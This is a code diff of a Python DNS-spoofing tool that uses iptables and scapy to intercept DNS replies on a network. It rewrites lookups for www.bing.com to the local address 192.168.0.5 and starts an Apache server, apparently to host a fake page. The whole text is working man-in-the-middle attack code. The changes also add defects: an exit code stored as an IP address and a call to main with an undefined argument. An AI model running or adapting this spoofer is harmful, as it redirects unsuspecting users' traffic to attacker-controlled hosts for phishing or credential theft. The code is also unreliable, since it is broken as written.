@@ -22,14 +22,17 @@ import os
 
 def main():
 	os.system("iptables -I FORWARD  -j NFQUEUE --queue-num  0")
+	pc_ip = os.system("hostname -I | awk '{print $1}'")
+	os.system('service apache2 start')
+
 
 	def process_packet(packet):
 		scapy_packet = scapy.IP(packet.get_payload())
 		if scapy_packet.haslayer(scapy.DNSRR):
 			qname = scapy_packet[scapy.DNSQR].qname
-			if "www.google.com" in qname:
+			if "www.bing.com" in qname:
 				print("[+] Spoofing target")
-				answer = scapy.DNSRR(rrname=qname, rdata="localhost")
+				answer = scapy.DNSRR(rrname = qname, rdata = "192.168.0.5")
 				scapy_packet[scapy.DNS].an = answer
 				scapy_packet[scapy.DNS].ancount = 1
 				
@@ -47,4 +50,4 @@ def main():
 	queue.run()
 
 if __name__ == "__main__":
-   main()
+   main(packet)
